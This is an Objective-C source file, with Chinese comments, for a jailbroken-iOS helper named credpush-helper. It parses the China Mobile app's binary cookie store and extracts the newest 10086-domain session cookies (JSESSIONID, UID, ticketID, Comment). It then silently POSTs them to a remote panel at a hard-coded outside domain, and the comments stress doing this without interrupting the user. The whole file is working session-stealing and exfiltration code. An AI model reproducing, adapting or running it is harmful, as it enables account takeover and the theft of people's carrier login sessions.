// credpush-helper —— 让 creddaemon 自己把会话推到面板（不切 App、不打断用户）
//
// 由 creddaemon.sh 调用：
//     credpush-helper --container <中国移动容器路径> --id <容器id> [--dry] [--server URL] [--token-file 路径]
// 退出码 0 = 推送成功（daemon 本轮不再 uiopen）；非 0 = 失败（daemon 回退 uiopen）。
//
// 为什么用 ObjC 而不是 Go：Go 交叉编译出来的是 macOS 平台的 Mach-O，iOS 直接拒绝加载
// （dyld: Library not loaded: /usr/lib/libSystem.B.dylib ... wrong platform）。
// 走 Theos TOOL 与 CredHUD 同一条构建链，平台/签名都是对的。
//
// 做的事：
//   1. 解析 <container>/Library/Cookies/Cookies.binarycookies（结构化，带创建时间）
//   2. 取 10086 域的 JSESSIONID/UID/Comment/ticketID，按 **cookie 创建时间** 挑最新一组
//   3. POST <server>/api/cred/push（带 X-Cred-Token）
//
// 安装位置：/var/jb/usr/libexec/credpush-helper（不要 /usr/local/bin —— roothide 会注入）

#import <Foundation/Foundation.h>

static NSString *CStr(NSData *rec, uint32_t off) {
    if (off == 0 || off >= rec.length) return @"";
    const uint8_t *p = rec.bytes;
    NSUInteger i = off;
    while (i < rec.length && p[i] != 0) i++;
    if (i <= off) return @"";
    return [[NSString alloc] initWithBytes:p + off length:(i - off) encoding:NSUTF8StringEncoding] ?: @"";
}

static uint32_t BE32(const uint8_t *p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}
static uint32_t LE32(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

// 返回 [{name, value, created}]，只看 10086 域
static NSArray<NSDictionary *> *ParseCookies(NSData *d) {
    NSMutableArray<NSDictionary *> *out = [NSMutableArray array];
    if (d.length < 8) return out;
    const uint8_t *b = d.bytes;
    if (memcmp(b, "cook", 4) != 0) return out;
    uint32_t npages = BE32(b + 4);
    if (npages == 0 || npages > 1000) return out;
    NSUInteger off = 8;
    NSMutableArray<NSNumber *> *sizes = [NSMutableArray array];
    for (uint32_t i = 0; i < npages; i++) {
        if (off + 4 > d.length) return out;
        [sizes addObject:@(BE32(b + off))];
        off += 4;
    }
    for (NSNumber *szN in sizes) {
        NSUInteger sz = szN.unsignedIntegerValue;
        if (sz == 0 || off + sz > d.length) break;
        NSData *page = [d subdataWithRange:NSMakeRange(off, sz)];
        off += sz;
        if (page.length < 8) continue;
        const uint8_t *pg = page.bytes;
        uint32_t cnt = LE32(pg + 4);
        for (uint32_t i = 0; i < cnt; i++) {
            NSUInteger p = 8 + 4 * i;
            if (p + 4 > page.length) break;
            uint32_t co = LE32(pg + p);
            if (co + 56 > page.length) continue;
            NSData *rec = [page subdataWithRange:NSMakeRange(co, page.length - co)];
            if (rec.length < 56) continue;
            const uint8_t *r = rec.bytes;
            uint32_t recSize = LE32(r);
            if (recSize > rec.length) recSize = (uint32_t)rec.length;
            rec = [rec subdataWithRange:NSMakeRange(0, recSize)];
            r = rec.bytes;
            if (rec.length < 56) continue;
            uint32_t doff = LE32(r + 16), noff = LE32(r + 20), voff = LE32(r + 28);
            double created = 0;
            memcpy(&created, r + 48, 8);
            NSString *dom = CStr(rec, doff);
            if (![dom containsString:@"10086"]) continue;
            [out addObject:@{@"name": CStr(rec, noff), @"value": CStr(rec, voff),
                             @"created": @(created)}];
        }
    }
    return out;
}

static NSDictionary *Newest(NSArray<NSDictionary *> *cs, NSString *name) {
    NSDictionary *best = nil;
    for (NSDictionary *c in cs) {
        if (![c[@"name"] isEqualToString:name]) continue;
        if ([c[@"value"] length] == 0) continue;
        if (!best || [c[@"created"] doubleValue] >= [best[@"created"] doubleValue]) best = c;
    }
    return best;
}

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        NSString *container = nil, *cid = @"", *server = @"", *tokenFile = nil;
        BOOL dry = NO;
        for (int i = 1; i < argc; i++) {
            NSString *a = [NSString stringWithUTF8String:argv[i]];
            if ([a isEqualToString:@"--container"] && i + 1 < argc) container = [NSString stringWithUTF8String:argv[++i]];
            else if ([a isEqualToString:@"--id"] && i + 1 < argc) cid = [NSString stringWithUTF8String:argv[++i]];
            else if ([a isEqualToString:@"--server"] && i + 1 < argc) server = [NSString stringWithUTF8String:argv[++i]];
            else if ([a isEqualToString:@"--token-file"] && i + 1 < argc) tokenFile = [NSString stringWithUTF8String:argv[++i]];
            else if ([a isEqualToString:@"--dry"]) dry = YES;
        }
        if (server.length == 0) server = NSProcessInfo.processInfo.environment[@"CREDD_PUSH_URL"];
        if (server.length == 0) server = @"https://ydhf.szafx.icu";
        while ([server hasSuffix:@"/"]) server = [server substringToIndex:server.length - 1];
        if (tokenFile.length == 0) tokenFile = @"/var/mobile/Library/CredDaemon/cred_push.token";
        if (container.length == 0) { printf("缺 --container\n"); return 2; }

        NSString *cf = [container stringByAppendingPathComponent:@"Library/Cookies/Cookies.binarycookies"];
        NSData *d = [NSData dataWithContentsOfFile:cf];
        if (!d) { printf("读不到 cookies: %s\n", cf.UTF8String); return 3; }

        NSArray<NSDictionary *> *cs = ParseCookies(d);
        NSDictionary *sid = Newest(cs, @"JSESSIONID");
        NSDictionary *uid = Newest(cs, @"UID");
        NSDictionary *tick = Newest(cs, @"ticketID");
        NSDictionary *comm = Newest(cs, @"Comment");
        if (!sid || !uid || !tick) {
            printf("会话不完整（sid=%d uid=%d ticket=%d）\n", sid != nil, uid != nil, tick != nil);
            return 4;
        }
        NSString *comment = comm[@"value"] ?: @"SessionServer-unity";
        NSString *sess = [NSString stringWithFormat:@"JSESSIONID=%@; UID=%@; Comment=%@; ticketID=%@;",
                          sid[@"value"], uid[@"value"], comment, tick[@"value"]];
        NSDate *cd = [NSDate dateWithTimeIntervalSince1970:[sid[@"created"] doubleValue]];
        NSDateFormatter *df = [NSDateFormatter new];
        df.dateFormat = @"MM-dd HH:mm:ss";
        printf("容器=%s sid=%.8s… uid=%.8s… ticket=%s 创建=%s\n",
               [[cid substringToIndex:MIN((NSUInteger)8, cid.length)] UTF8String],
               [sid[@"value"] UTF8String], [uid[@"value"] UTF8String],
               [tick[@"value"] UTF8String],
               [[df stringFromDate:cd] UTF8String]);

        NSString *token = [[NSString stringWithContentsOfFile:tokenFile encoding:NSUTF8StringEncoding error:nil]
                           stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
        if (token.length == 0 && !dry) { printf("没有推送令牌: %s\n", tokenFile.UTF8String); return 5; }

        if (dry) {
            printf("DRY 会推: %.24s… -> %s/api/cred/push\n", [sess UTF8String], server.UTF8String);
            return 0;
        }

        NSData *body = [NSJSONSerialization dataWithJSONObject:@{@"sessions": @[sess]} options:0 error:nil];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:
                                    [NSURL URLWithString:[server stringByAppendingString:@"/api/cred/push"]]];
        req.HTTPMethod = @"POST";
        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        [req setValue:token forHTTPHeaderField:@"X-Cred-Token"];
        req.HTTPBody = body;
        req.timeoutInterval = 25;

        __block NSData *respData = nil;
        __block NSInteger status = 0;
        __block NSError *err = nil;
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req
            completionHandler:^(NSData *data, NSURLResponse *resp, NSError *e) {
                respData = data; err = e;
                status = [(NSHTTPURLResponse *)resp statusCode];
                dispatch_semaphore_signal(sem);
            }];
        [task resume];
        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(28 * NSEC_PER_SEC)));

        if (err || status != 200) {
            printf("推送失败: HTTP %ld %s\n", (long)status, err.localizedDescription.UTF8String ?: "");
            return 6;
        }
        NSDictionary *resp = respData ? [NSJSONSerialization JSONObjectWithData:respData options:0 error:nil] : nil;
        printf("HTTP 200 %.300s\n", [[[NSString alloc] initWithData:respData encoding:NSUTF8StringEncoding] UTF8String] ?: "");
        if (![resp isKindOfClass:[NSDictionary class]] || ![resp[@"ok"] boolValue]) return 7;
        for (NSDictionary *it in resp[@"items"] ?: @[]) {
            if ([it[@"ok"] boolValue]) { printf("✓ 推送成功\n"); return 0; }
        }
        printf("服务端没有接受这条会话\n");
        return 8;
    }
}
